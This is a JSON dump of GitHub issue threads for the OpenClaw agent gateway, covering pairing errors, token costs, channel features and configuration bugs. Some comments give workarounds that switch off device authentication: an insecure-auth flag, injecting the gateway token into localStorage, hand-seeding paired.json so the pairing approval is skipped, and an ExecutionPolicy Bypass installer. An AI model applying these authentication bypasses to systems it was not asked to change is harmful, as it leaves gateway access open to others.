          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4833#issuecomment-3832470117",
          "createdAt": "2026-02-02T01:30:58Z",
          "updatedAt": "2026-02-02T01:30:58Z",
          "author": "metabsd",
          "body": "That workaround work for me.\n```\n    \"controlUi\": {\n      \"allowInsecureAuth\": true\n    }\n```"
        },
        {
          "id": 3864443933,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4833#issuecomment-3864443933",
          "createdAt": "2026-02-07T12:43:00Z",
          "updatedAt": "2026-02-07T12:43:00Z",
          "author": "dmitryturcan",
          "body": "The above work around didn't help me, what did:\nWorkaround for PWA/Safari Control UI \"device identity required\" error\n\n  When accessing Control UI via Tailscale Serve or reverse proxy, the gateway.controlUi.dangerouslyDisableDeviceAuth: true config doesn't seem to be\n  respected.\n\n  Workaround: Create an auth.html that injects the token into localStorage:\n\n  <!DOCTYPE html>\n  <html>\n  <head><meta charset=\"UTF-8\"><title>Auth</title></head>\n  <body>\n  <script>\n  localStorage.setItem(\"openclaw.control.settings.v1\", JSON.stringify({token:\"YOUR_GATEWAY_TOKEN\"}));\n  window.location.href = \"/\";\n  </script>\n  </body>\n  </html>\n\n  Place it in /app/dist/control-ui/auth.html (inside container) and visit /auth.html once. Especially useful for PWAs where dev console isn't accessible.\n\n  Environment: macOS Safari PWA, OpenClaw 2026.2.6"
        },
        {
          "id": 3880393780,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4833#issuecomment-3880393780",
          "createdAt": "2026-02-10T20:00:05Z",
          "updatedAt": "2026-02-10T20:00:05Z",
          "author": "TerminalGravity",
          "body": "## Additional reproduction + workaround (v2026.2.9)\n\n### Environment\n- **Gateway:** v2026.2.9 (33c75cb) on Ubuntu, bound to Tailscale IP (`bind: tailnet`)\n- **Node:** v2026.2.9 on Ubuntu (separate machine, same tailnet)\n- **Connection:** direct Tailscale peer link, no relay\n\n### Reproduction\n\nSame behavior as described. Gateway auth token is accepted (verified by first getting `token_mismatch` without it, then `pairing required` with it), but the connection is closed at the WebSocket level before a pending pairing request is ever created.\n\n**Notably, the `--node-id` workaround mentioned in this issue did NOT fix it for us on v2026.2.9.** The node generates a device identity at `~/.openclaw/identity/device.json` on first run regardless of `--node-id`, but the gateway still rejects at the handshake stage:\n\n```\nOPENCLAW_GATEWAY_TOKEN=<token> openclaw node run --node-id ugc-factory-01 --host <gateway-ip> --port 18789 --display-name \"ugc-factory-01\"\n```\n\nGateway log shows the deviceId and requestId are present, but the connection is closed before any pending request is queued:\n\n```\nwarn gateway/ws {\"cause\":\"pairing-required\",\"handshake\":\"failed\",\n  \"deviceId\":\"b186ff3e...\",\n  \"requestId\":\"c3a1c70d-d33a-478b-a6dc-5aa326b1b024\",\n  \"reason\":\"not-paired\"} closed before connect ... code=1008 reason=pairing required\n```\n\n`openclaw nodes pending` always returns empty.\n\n### Workaround: pre-seed `paired.json`\n\nSince the gateway never queues the pending request, we bypassed the pairing flow entirely by manually adding the node's device entry to the gateway's `~/.openclaw/devices/paired.json`:\n\n1. On the node, read the device identity: `cat ~/.openclaw/identity/device.json` to get the `deviceId` and `publicKeyPem`\n2. Extract the raw public key as URL-safe base64 (for the `publicKey` field)\n3. Generate a random token: `openssl rand -hex 16`\n4. Add an entry to the gateway's `paired.json` modeled after existing node entries:\n\n```json\n{\n  \"<deviceId>\": {\n    \"deviceId\": \"<deviceId>\",\n    \"publicKey\": \"<base64url-encoded-public-key>\",\n    \"displayName\": \"my-node\",\n    \"platform\": \"linux\",\n    \"clientId\": \"node-host\",\n    \"clientMode\": \"node\",\n    \"role\": \"node\",\n    \"roles\": [\"node\"],\n    \"tokens\": {\n      \"node\": {\n        \"token\": \"<random-hex-token>\",\n        \"role\": \"node\",\n        \"scopes\": [],\n        \"createdAtMs\": <timestamp>\n      }\n    },\n    \"createdAtMs\": <timestamp>,\n    \"approvedAtMs\": <timestamp>,\n    \"remoteIp\": \"<node-tailscale-ip>\"\n  }\n}\n```\n\n5. Restart the gateway: `openclaw gateway restart`\n6. Start the node — it connects successfully as already-paired\n\nThis has been stable for 40+ minutes with no disconnects. The node shows `paired · connected` with capabilities `browser, system`."
        }
      ]
    },
    {
      "number": 11460,
      "title": "WhatsApp: Add support for querying message reactions",
      "body": "## Summary\nWhen using WhatsApp as a channel, there's currently no way to query reactions on messages.\n\n## Current Behavior\n- ✅ **Sending reactions works** via `message react` action\n- ⚠️ **Receiving reaction notifications**: Config exists (`reactionNotifications: \"own\"`) but unclear if events surface to agent\n- ❌ **Querying reactions**: `openclaw message reactions --channel whatsapp` returns \"not supported for channel whatsapp\"\n\n## Expected Behavior\n1. `message reactions` action should work for WhatsApp (list reactions on a message)\n2. Reaction events should be queryable/searchable (either via CLI or stored in a way the agent can access)\n3. Historical reactions should be retrievable (not just real-time notifications)\n\n## Technical Context\n- wacli (the WhatsApp CLI) doesn't persist reactions in its SQLite database\n- The whatsmeow library (underlying Go library) supports reactions in the protocol\n- OpenClaw receives reaction events (based on config options) but doesn't expose them\n\n## Use Case\nAI agents benefit from reaction feedback as training signals:\n- ❤️ Love → Strong approval, do more of this\n- 👍 Like → Approval\n- 👎 Dislike → Avoid this pattern\n- 😂 Laugh → Humor landed\n\nThis creates a feedback loop for agent behavior improvement.\n\n## Proposed Solution\nEither:\n1. Add reactions table to wacli and expose via `wacli messages` output\n2. Add reaction storage/query to OpenClaw's WhatsApp provider directly\n3. Surface reaction events as system events the agent can process and log\n\n## Environment\n- OpenClaw 2026.2.6-3\n- wacli (latest)\n- macOS/Darwin",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/11460",
      "createdAt": "2026-02-07T20:57:55Z",
      "updatedAt": "2026-02-10T19:55:22Z",
      "author": "ario",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [
          "whatsapp"
        ],
        "platforms": [
          "macos",
          "linux"
        ],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3880371636,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11460#issuecomment-3880371636",
          "createdAt": "2026-02-10T19:55:22Z",
          "updatedAt": "2026-02-10T19:55:22Z",
          "author": "asklee-klawd",
          "body": "I'd like to work on this!\n\n**Proposed approach:**\n\nSurface incoming reaction events as system messages that agents can see and process. Something like:\n\n```\nSystem: [Reaction] 👍 from +33670178760 on message 3EB06D4A...\n```\n\nThis would enable the feedback loop mentioned in the issue - agents could learn from reactions as sentiment signals.\n\n**Implementation plan:**\n1. Find where WhatsApp webhook handles reaction events (likely in `extensions/whatsapp/`)\n2. Surface these events to the agent session (similar to how message events work)\n3. Include: emoji, reactor ID, target message ID, add/remove action\n\nI'll start exploring the codebase and will submit a PR if I get it working.\n\ncc @ario - happy to coordinate if you have preferences on the approach."
        }
      ]
    },
    {
      "number": 13639,
      "title": "[Bug]:",
      "body": "## Summary\n\nI think the last 2 versions broke Telegram.  When I am sending a message from Telegram, I can see it arriving on the gateway, and in the CLI, I can see my LLM (glm_4.7) reacting.  But as soon as it finished, I get an error in Telegram: \"API provider returned a billing error—your API key has run out of credits or has an insufficient balance.\" Check your provider's billing dashboard and top up or switch to a different API key\". \n\nThere is nothing wrong with my glm subscription.\n\nI did the usual tests..\nopenclaw --version (2026.2.9)\nopenclaw memory status gives me\n\nNo API key found for provider (openai) the file its refering to has nothing about openai.\nSame message I get for providers (google and voyage). But I cannot find anything on them in the config. \n\n\n## Steps to reproduce\n\nI made a backup of ~/.openclaw and resetted everything.  Did the onboarding, linked it to Telegram, and asked it hi ... again same billing error in Telegram but not in cli... cli works fine. \n## Expected behavior\n\nWhat did you expect to happen?\n\n## Actual behavior\n\nWhat actually happened?\n\n## Environment\n\n- Clawdbot version:2026-2-9\n- OS: Ubuntu 25.10\n- Install method (pnpm/npx/docker/etc):\n-Install.sh from site. \n\n## Logs or screenshots\nnothing to show, evertything I get I mentioned. \nPaste relevant logs or add screenshots (redact secrets).\n",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13639",
      "createdAt": "2026-02-10T19:52:38Z",
      "updatedAt": "2026-02-10T19:54:58Z",
      "author": "najef1979-code",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [
          "linux",
          "docker"
        ],
        "components": [
          "gateway",
          "web-ui",
          "onboarding",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3880369882,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13639#issuecomment-3880369882",
          "createdAt": "2026-02-10T19:54:58Z",
          "updatedAt": "2026-02-10T19:54:58Z",
          "author": "najef1979-code",
          "body": "Yes please, but if you already have a solution I would like to know it.  even resetting my workspace does not solve the issue... GML 4.7 does not have issues. \n\nz.ai GLM Coding Plan Quota Check (Detailed - PS 5.1 compatible)\n=======================================================\n\nQuerying: https://api.z.ai/api/monitor/usage/quota/limit\n\nSUCCESS! Quota data loaded.\n\nFound 2 quota entries:\n\nQuota Entry #1\n-------------------\n\n\ntype         : TIME_LIMIT\nunit         : 5\nnumber       : 1\nusage        : 1000\ncurrentValue : 0\nremaining    : 1000\npercentage   : 0\nusageDetails : {@{modelCode=search-prime; usage=0}, @{modelCode=web-reader; usage=0}, @{modelCode=zread; usage=0}}\n\n\n\n\nReported % Used  : 0%\nType/Name: TIME_LIMIT\n\nQuota Entry #2\n-------------------\n\n\ntype          : TOKENS_LIMIT\nunit          : 3\nnumber        : 5\npercentage    : 1\nnextResetTime : 1770730465673\n"
        }
      ]
    },
    {
      "number": 6445,
      "title": "OpenClaw is using much tokens and it cost to much",
      "body": "OpenClaw is using much tokens and it cost to much",
      "state": "closed",
      "comments": 11,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/6445",
      "createdAt": "2026-02-01T17:18:56Z",
      "updatedAt": "2026-02-10T19:50:57Z",
      "author": "PierrunoYT",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": []
      },
      "commentsData": [
        {
          "id": 3831496092,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/6445#issuecomment-3831496092",
          "createdAt": "2026-02-01T17:28:24Z",
          "updatedAt": "2026-02-01T17:30:37Z",
          "author": "niceguy4",
          "body": "Openclaw is free and doesn't charge anything to use. Adjust your API usage by using lower cost models, adjust memory, and make sure to start new sessions after a concept/topic is done. Turn off memory if its generating to many tokens: https://docs.openclaw.ai/concepts/memory"
        },
        {
          "id": 3831501167,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/6445#issuecomment-3831501167",
          "createdAt": "2026-02-01T17:30:58Z",
          "updatedAt": "2026-02-01T17:30:58Z",
          "author": "PierrunoYT",
          "body": "Hello. Yeah I mean maybe it's coded wrong because I already spend 40 dollars and doesnt even use it much. Using Haiku 4.5"
        },
        {
          "id": 3831514614,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/6445#issuecomment-3831514614",
          "createdAt": "2026-02-01T17:35:23Z",
          "updatedAt": "2026-02-01T17:35:23Z",
          "author": "digitaldias",
          "body": "Plenty of opensource models you can run instead, look into qwen, deepSeek, GLM and others. "
        },
        {
          "id": 3831519394,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/6445#issuecomment-3831519394",
          "createdAt": "2026-02-01T17:36:32Z",
          "updatedAt": "2026-02-01T17:36:32Z",
          "author": "PierrunoYT",
          "body": "> Plenty of opensource models you can run instead, look into qwen, deepSeek, GLM and others.\n\nWill check. Which Cloud Model can you recommend?"
        },
        {
          "id": 3831534419,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/6445#issuecomment-3831534419",
          "createdAt": "2026-02-01T17:40:15Z",
          "updatedAt": "2026-02-01T17:40:15Z",
          "author": "luna-system",
          "body": "GLM or Kimi Code are the stars of the show right now. a Z.ai or Moonshot \"coding\" plan will be your best bet here if you're looking for ultra-cheap and ultra-predictable (pricing wise)\n\nyou can also use local models - qwen is a great choice here, and GLM along with many others can be run thru ollama.\n\nyou can also use a $10/mo google ai pro sub for gemini support.\n\nultimately, Claude models are amongst the most expensive. worth it, very often, for one reason or another, but Kimi Code has a great personality, and lands solidly between Haiku and Sonnet, bar for bar. i use kimi code for my opencode/crush sessions too. banger model. GLM is my long-term sysadmin model for the VPSs that are running openclaw :)"
        },
        {
          "id": 3831558934,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/6445#issuecomment-3831558934",
          "createdAt": "2026-02-01T17:45:12Z",
          "updatedAt": "2026-02-01T17:45:32Z",
          "author": "niceguy4",
          "body": "Not to be a OpenAI shill but I believe you can get costs down to something like $0.05 per million tokens. "
        },
        {
          "id": 3831640720,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/6445#issuecomment-3831640720",
          "createdAt": "2026-02-01T18:10:00Z",
          "updatedAt": "2026-02-01T18:12:40Z",
          "author": "niceguy4",
          "body": "@PierrunoYT https://github.com/openclaw/openclaw/discussions/1949 btw, the recommendation may have a different path. I found the jsons here,  .openclaw/agents/main/sessions/"
        },
        {
          "id": 3831783723,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/6445#issuecomment-3831783723",
          "createdAt": "2026-02-01T19:10:27Z",
          "updatedAt": "2026-02-01T19:10:27Z",
          "author": "C00kiesOnGit",
          "body": "I'm not entirely sure if there isn't still a bug somewhere. I'm using a fresh installation of Linux Mint, OpenRouter, and Claude Sonnet 4.5.\n\nAfter starting a new session I asked the question via the dashboard chat: \"Explain what a pull request on GitHub means.\"\n\nClaud's answer:\n\"A **pull request** (PR) is how you propose changes to a project on GitHub.\nHere's the flow:\n1. **You fork or branch** - Make your own copy of the repo or create a branch\n2. **You make changes** - Add features, fix bugs, whatever\n3. **You open a PR** - Saying \"Hey, I made these changes, want to merge them into the main project?\"\n4. **Review happens** - Maintainers (or team members) look at your code, comment, request changes\n5. **Merge or close** - If approved, your changes get merged into the main codebase. If not, it gets \n**Why \"pull\" request?** Because you're asking the project maintainers to *pull* your changes into their repository.\nIt's basically GitHub's way of doing collaborative code review before changes become official. Think of it like submitting a draft for approval instead of just editing the live document.\nCommon in open source - you \"See a bug, fix it, submit a PR, and if the maintainers like it, boom, you're a contributor.\"\n\nAfter that, I deactivated *all* skills, started again a new session and asked the same question again. (This time the answer was a bit longer). As you can see (06:44 and 06:45), the costs for both - restarting the session and answering - decreased. Nevertheless, ~13 tsd Token just for this question is about as efficient as picking up a pizza with a truck. But I know that OpenClaw is still very new. I'm practicing patience and hoping for improvements.\n\n<img width=\"1124\" height=\"334\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/3c750d64-6181-4285-996a-17229797a509\" />"
        },
        {
          "id": 3848808501,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/6445#issuecomment-3848808501",
          "createdAt": "2026-02-04T17:37:45Z",
          "updatedAt": "2026-02-04T17:37:45Z",
          "author": "1bcMax",
          "body": "This cost pain is real — defaulting to expensive models for every query adds up fast. We built an open-source OpenClaw plugin called ClawRouter that automatically routes simple queries (lookups, basic math, greetings) to cheap models like Gemini Flash ($0.002/query) and only escalates to Opus/Sonnet for genuinely complex tasks.\n\n14-dimension classifier runs 100% locally in <1ms. No configuration per query — it just works as a drop-in provider.\n\nWeighted average cost drops from $60/M tokens to ~$16/M. Would have caught the 13K-token simple PR explanation and routed it to a $2/M model instead of Sonnet at $15/M.\n\nMIT licensed: https://github.com/BlockRunAI/ClawRouter"
        },
        {
          "id": 3876596023,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/6445#issuecomment-3876596023",
          "createdAt": "2026-02-10T10:01:18Z",
          "updatedAt": "2026-02-10T10:01:18Z",
          "author": "erinkhoo",
          "body": "The default LLM model API choices during `openclaw onboard` are not optimized for token economy. e.g. OAI, Anthropic, Minimax, Qwen, Synthetic, Venice AI, Google, Copilot, OpenRouter, Vercel AI Gateway, Moonshot, Z.AI, OpenCode Zen. \n\nIdeally it would offer a few OS model inference accelerators such as Baseten or Cerebras so you can use Kimi K2/2.5 and GLM 4.7 with just a single API key. The workaround is to use OpenRouter or Vercel AI Gateway which adds complexity e.g. openrouter/auto doesn't work unless you have a paid account. xAI models are also a good choice.\n\nAn internal model router logic does make sense but can be codified in the internal .md files. Use a capable model for x, use a data processing model for y, only use local inference ollama qwen3:14b for heartbeats (as every 30m Openclaw will send whole context to your chosen 'LLM model API') which is a nonsense design"
        },
        {
          "id": 3880352594,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/6445#issuecomment-3880352594",
          "createdAt": "2026-02-10T19:50:57Z",
          "updatedAt": "2026-02-10T19:50:57Z",
          "author": "1bcMax",
          "body": "@erinkhoo Good points on the model routing. To add to this — for the low-end work (heartbeats, simple lookups, basic context gathering), you can use **free models** entirely.\n\nBlockRun.ai offers free-tier models that are perfect for this use case. No API keys to manage, pay-per-request micropayments only when you need premium models. For heartbeats and routine pings, the free tier handles it at $0.\n\nCombined with ClawRouter's classifier, you can get:\n- **Free**: heartbeats, health checks, simple queries\n- **Cheap** ($0.002/query): Gemini Flash, DeepSeek for moderate complexity  \n- **Premium**: Opus/Sonnet only when genuinely needed\n\nThis takes the weighted average cost even lower than $16/M tokens — closer to $8-10/M for typical mixed workloads."
        }
      ]
    },
    {
      "number": 13635,
      "title": "openclaw agent --session-id does not resolve agent workspace from session key",
      "body": "## Bug Description\n\nWhen using `openclaw agent --session-id agent:<subagent>:main`, the agent workspace is not resolved from the session key. The workspace falls back to `workspace-main` (the default) instead of the configured workspace for the sub-agent.\n\n## Steps to Reproduce\n\n1. Configure a sub-agent in `openclaw.json` with a custom workspace:\n```json\n{\n  \"id\": \"jarvis\",\n  \"name\": \"Jarvis\",\n  \"workspace\": \"/Users/joe/.openclaw/workspace-jarvis\",\n  \"model\": \"anthropic/claude-sonnet-4-5\"\n}\n```\n\n2. Send a message via CLI:\n```bash\nopenclaw agent --message \"Read SOUL.md\" --session-id agent:jarvis:main --json\n```\n\n3. The agent reads `SOUL.md` from `~/.openclaw/workspace-main/` instead of `~/.openclaw/workspace-jarvis/`.\n\n## Root Cause\n\nIn `agent.ts` (minified: `agent-C-LFFPB6.js`), line ~368:\n\n```javascript\nconst sessionAgentId = agentIdOverride ?? resolveAgentIdFromSessionKey(opts.sessionKey?.trim());\n```\n\nThis only extracts the agent ID from `opts.sessionKey`, not from `opts.sessionId`. When `--session-id` is used (which maps to `opts.sessionId`), `opts.sessionKey` is undefined, so `resolveAgentIdFromSessionKey(undefined)` returns the default agent ID. The workspace then resolves to the default agent's workspace (`workspace-main`) instead of the sub-agent's configured workspace.\n\n## Expected Behavior\n\n`--session-id agent:jarvis:main` should resolve agent ID \"jarvis\" and use the workspace configured for that agent.\n\n## Workaround\n\nSymlink `workspace-main` → `workspace-<subagent>` so both paths point to the same files. Not ideal if multiple sub-agents exist.\n\n## Environment\n\n- OpenClaw 2026.2.9 (33c75cb)\n- macOS (arm64)",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13635",
      "createdAt": "2026-02-10T19:46:56Z",
      "updatedAt": "2026-02-10T19:46:56Z",
      "author": "joetomasone",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "config"
        ]
      }
    },
    {
      "number": 8856,
      "title": "Feature Request: Passive \"Log-Only\" Mode for Telegram Groups",
      "body": "# Feature Request: Passive \"Log-Only\" Mode for Telegram Groups (Context without Token Burn)\n\n### Is your feature request related to a problem? Please describe.\nCurrently, when configuring a Telegram channel for a group, we have a binary choice via `requireMention`:\n\n1. **`true` (Default):** The bot ignores all messages not directed at it.\n   - **Pro:** Saves tokens.\n   - **Con:** The bot is \"blind\" to the group context. When a scheduled task (Heartbeat/Cron) wakes the agent up, `sessions_history` only contains system messages and explicit mentions. The agent cannot analyze the \"vibe\" or recent topics of the chat.\n\n2. **`false`:** The bot processes *every* message.\n   - **Pro:** Full context awareness.\n   - **Con:** Extremely expensive (burns tokens on every single message just to output `NO_REPLY`). Not viable for active high-traffic groups.\n\nSince the Telegram Bot API explicitly forbids bots from fetching past history (`messages.getHistory` is not available), there is currently **no way** to implement a cost-effective \"Observer\" agent that stays silent but knows what's happening.\n\n### Describe the solution you'd like\nI propose a third mode for `requireMention` (or a new flag like `passiveHistory: true`):\n\n**\"Passive / Log-Only Mode\"**\n\n- **Behavior:** When a message arrives that *does not* match the mention criteria:\n  - Do **NOT** trigger the Agent/LLM run.\n  - **BUT** inject the message into the Session Memory / History log (as if it were processed).\n- **Result:** The agent stays asleep (0 token cost). However, when it is eventually woken up (by a Mention or a Heartbeat/Cron event), the `sessions_history` tool returns the full recent chat history, allowing the agent to analyze context it previously \"passively observed.\"\n\n### Describe alternatives you've considered\n- **Userbots:** Using MTProto `messages.getHistory` via a separate script. Works, but requires a separate phone number/account and external scripts (GramJS), which breaks the \"all-in-one\" platform experience.\n- **Parsing Logs:** Grepping Gateway logs from a heartbeat script. Hacky, unreliable, and depends on log rotation/formats.\n- **Eating the cost:** Setting `requireMention: false` and paying for every \"Hello\" in a busy chat. Too expensive.\n\n### Additional context\nThis feature is critical for \"Observer\" or \"Moderator\" style agents that run on a schedule (Heartbeat) to summarize discussions or intervene only when necessary, without responding to every single line in real-time.\n",
      "state": "closed",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/8856",
      "createdAt": "2026-02-04T14:04:17Z",
      "updatedAt": "2026-02-10T19:42:16Z",
      "author": "an664",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 13634,
      "title": "Feature: Slack workspace file injection + global systemPrompt (parity with Telegram)",
      "body": "## Problem\n\nSlack sessions start with **zero context** — no AGENTS.md, SOUL.md, MEMORY.md, USER.md injected. This is different from Telegram which gets full workspace file injection automatically.\n\n**Current workaround:** Use `systemPrompt` with `file:path/to/file.md` per-channel. But this requires:\n1. Manually creating a combined context file\n2. Adding `systemPrompt` to **every** channel individually (no global option)\n\n## Why this matters\n\nWithout context injection, Slack bots:\n- Claim \"no access\" to tools they have\n- Ask for information already provided\n- Lose identity/personality defined in SOUL.md\n- Miss critical guardrails from AGENTS.md\n\n## Requests\n\n### 1. Global Slack systemPrompt\nAdd `channels.slack.systemPrompt` (like Telegram has) that applies to all channels unless overridden.\n\n```json\n{\n  \"channels\": {\n    \"slack\": {\n      \"systemPrompt\": \"file:brain/slack/SLACK-SYSTEM-PROMPT.md\"\n    }\n  }\n}\n```\n\n### 2. Workspace file injection for Slack\nInject workspace files (AGENTS.md, SOUL.md, etc.) into Slack sessions the same way Telegram does.\n\nThis would make Slack a first-class citizen matching Telegram's behavior.\n\n## Current config (workaround)\n\n```json\n{\n  \"channels\": {\n    \"slack\": {\n      \"channels\": {\n        \"U04N0A45W6S\": {\n          \"allow\": true,\n          \"systemPrompt\": \"file:brain/slack/SLACK-SYSTEM-PROMPT.md\"\n        },\n        \"C039PUGE13P\": {\n          \"allow\": true,\n          \"systemPrompt\": \"file:brain/slack/SLACK-SYSTEM-PROMPT.md\"\n        }\n      }\n    }\n  }\n}\n```\n\nMust repeat for every channel. No global option.\n\n## Environment\n- OpenClaw: 2026.2.9\n- Slack mode: Socket",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13634",
      "createdAt": "2026-02-10T19:41:41Z",
      "updatedAt": "2026-02-10T19:41:41Z",
      "author": "visshehi",
      "labels": [],
      "taxonomy": {
        "channels": [
          "telegram",
          "slack"
        ],
        "platforms": [],
        "components": [
          "config"
        ]
      }
    },
    {
      "number": 13633,
      "title": "[Bug]: Aliyun/Qwen provider does not support 'developer' role",
      "body": "## Bug Report: Aliyun/Qwen provider does not support `developer` role\n\n### Summary\nThe Aliyun provider (for Qwen models like `qwen3-max`) does not support the OpenAI-compatible `developer` role, causing API errors when this role is used in message arrays.\n\n### Error Message\n```json\n{\n  \"error\": {\n    \"code\": \"InvalidParameter\",\n    \"message\": \"developer is not one of ['system', 'assistant', 'user', 'tool', 'function']\"\n  }\n}\n```\n\n### Root Cause\nOpenClaw uses the new OpenAI `developer` role (replacing the deprecated `system` role) for system messages. However, Aliyun/Dashscope's OpenAI-compatible API only accepts the traditional `system` role and does not recognize `developer`.\n\n### Steps to Reproduce\n1. Configure OpenClaw to use an Aliyun model (e.g., `qwen3-max`):\n   ```json\n   {\n     \"model\": \"aliyun/qwen3-max\"\n   }\n   ```\n2. Send any request that includes system/developer messages\n3. Observe the API error\n\n### Expected Behavior\nThe Aliyun provider should map the `developer` role to `system` before sending requests to the Dashscope API.\n\n### Actual Behavior\nThe `developer` role is passed through unchanged, causing the Aliyun API to reject the request.\n\n### Environment\n- OpenClaw version: latest\n- Model: `aliyun/qwen3-max`\n- Provider: Aliyun/Dashscope\n\n### Suggested Fix\nIn the Aliyun provider implementation, add role mapping logic:\n```javascript\n// Before sending to Aliyun API\nif (message.role === 'developer') {\n  message.role = 'system';\n}\n```\n\nThis aligns with OpenAI's transition from `system` to `developer` while maintaining compatibility with providers that haven't updated yet.\n\n### Workarounds (for users until fixed)\n1. Use `kimi-2.5` or other models that support `developer` role\n2. Use `qwen3-max` as `imageModel` only (where role mapping is less critical)\n\n---\nSubmitted by: @lubocl (GitHub account via Google Sign-in)\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13633",
      "createdAt": "2026-02-10T19:38:30Z",
      "updatedAt": "2026-02-10T19:38:30Z",
      "author": "luboclaw",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "config"
        ]
      }
    },
    {
      "number": 13629,
      "title": "Feature Request: Notification on model fallback",
      "body": "## Feature Request\n\n**Summary**\nWhen the primary model fails and OpenClaw switches to a fallback model, send a notification to the user.\n\n**Use Case**\nUsers want to know when they're getting responses from a fallback model instead of their primary model. This is important for:\n- Awareness of service degradation\n- Understanding response quality differences\n- Debugging issues\n\n**Suggested Implementation**\nOptions could include:\n1. A configurable notification message when fallback is triggered\n2. A hook that fires on model switch\n3. A prefix/suffix added to responses from fallback models\n4. Integration with existing notification channels (WhatsApp, Telegram, etc.)\n\n**Configuration Suggestion**\n```json\n{\n  \"agents\": {\n    \"defaults\": {\n      \"model\": {\n        \"primary\": \"anthropic/claude-opus-4-5\",\n        \"fallbacks\": [\"siliconflow/Qwen/Qwen3-Coder-480B-A35B-Instruct\"],\n        \"notifyOnFallback\": true,\n        \"fallbackNotificationMessage\": \"⚠️ Switched to fallback model: {model}\"\n      }\n    }\n  }\n}\n```\n\n**Environment**\n- OpenClaw version: 2026.2.9\n- Primary use: WhatsApp channel\n\nThank you!",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13629",
      "createdAt": "2026-02-10T19:33:00Z",
      "updatedAt": "2026-02-10T19:33:00Z",
      "author": "lhj1026",
      "labels": [],
      "taxonomy": {
        "channels": [
          "telegram",
          "whatsapp"
        ],
        "platforms": [],
        "components": [
          "gateway",
          "config"
        ]
      }
    },
    {
      "number": 13628,
      "title": "[Bug]: One Line Installer Fails on Windows",
      "body": "\nProblem:\n\nThe one line installer fails for 2 reasons, running scripts disabled, and it doesn't install Git.\n\n\nSolution:\n\nChange one line installer to include -ExecutionPolicy Bypass -Command \"one line installer command here\"\n\nHave the install script install Git.\n\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13628",
      "createdAt": "2026-02-10T19:32:04Z",
      "updatedAt": "2026-02-10T19:32:04Z",
      "author": "koorbmeh",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "windows"
        ],
        "components": [
          "websocket"
        ]
      }
    },
    {
      "number": 13496,
      "title": "[Bug]: Gateway auto-creates plugins.entries.bluebubbles with enabled:false, overriding channels config",
      "body": "## Description\n\nThe gateway automatically creates a `plugins.entries.bluebubbles` entry with `enabled: false` whenever the config is reloaded. This overrides `channels.bluebubbles.enabled: true`, effectively disabling the BlueBubbles channel.\n\n## Steps to Reproduce\n\n1. Configure `channels.bluebubbles.enabled: true` in the gateway config\n2. Start or restart the gateway\n3. Observe that `plugins.entries.bluebubbles: { enabled: false }` is auto-created\n4. The channel is disabled because the plugins.entries key takes precedence\n\nRemoving the `plugins.entries.bluebubbles` key manually does not help — the gateway recreates it on the next restart/reload.\n\n## Additional Context\n\n- This may also cause duplicate plugin registration. When both `channels.bluebubbles` and `plugins.entries.bluebubbles` exist, a **\"duplicate plugin id detected\"** warning appears in the logs.\n- Likely related to #9951 and #9079.\n\n## Workaround\n\nExplicitly set `plugins.entries.bluebubbles.enabled: true` in the config to override the auto-generated value.\n\n## Environment\n\n- **OpenClaw:** 2026.2.9\n- **OS:** macOS 26.2 (arm64)",
      "state": "closed",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13496",
      "createdAt": "2026-02-10T16:00:28Z",
      "updatedAt": "2026-02-10T19:30:57Z",
      "author": "samwise-sam",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3880262889,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13496#issuecomment-3880262889",
          "createdAt": "2026-02-10T19:30:57Z",
          "updatedAt": "2026-02-10T19:30:57Z",
          "author": "samwise-sam",
          "body": "Closing — this was caused by a config artifact from migrating from ClawdBot to OpenClaw, not an OpenClaw bug. The fix was setting `plugins.entries.bluebubbles.enabled: true` explicitly. The gateway behavior of auto-creating this entry may be intentional for plugin management."
        }
      ]
    },
    {
      "number": 13627,
